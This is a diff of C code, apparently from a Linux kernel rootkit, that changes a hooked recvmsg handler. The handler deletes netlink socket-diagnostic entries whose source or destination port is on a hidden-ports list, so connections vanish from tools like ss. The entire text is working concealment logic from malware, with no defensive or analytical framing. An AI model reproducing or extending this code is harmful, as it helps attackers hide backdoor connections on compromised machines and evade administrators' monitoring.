@@ -178,18 +178,16 @@ g7_recvmsg(struct pt_regs *pt_regs)
         int src = ntohs(((struct inet_diag_msg *)NLMSG_DATA(nh))->id.idiag_sport);
         int dst = ntohs(((struct inet_diag_msg *)NLMSG_DATA(nh))->id.idiag_dport);
 
-        if (!(list_contains_port(&hidden_ports, src, -1)
-            || list_contains_port(&hidden_ports, dst, -1)))
+        if (list_contains_port(&hidden_ports, src, -1)
+            || list_contains_port(&hidden_ports, dst, -1))
         {
+            int alignment = NLMSG_ALIGN(nh->nlmsg_len);
+            for (i = 0; i < len; ++i)
+                ((char *)nh)[i] = ((char *)nh)[i + alignment];
+
+            ret -= alignment;
+        } else
             nh = NLMSG_NEXT(nh, len);
-            continue;
-        }
-
-        int alignment = NLMSG_ALIGN(nh->nlmsg_len);
-        for (i = 0; i < len; ++i)
-            ((char *)nh)[i] = ((char *)nh)[i + alignment];
-
-        ret -= alignment;
     }
 
     return ret;
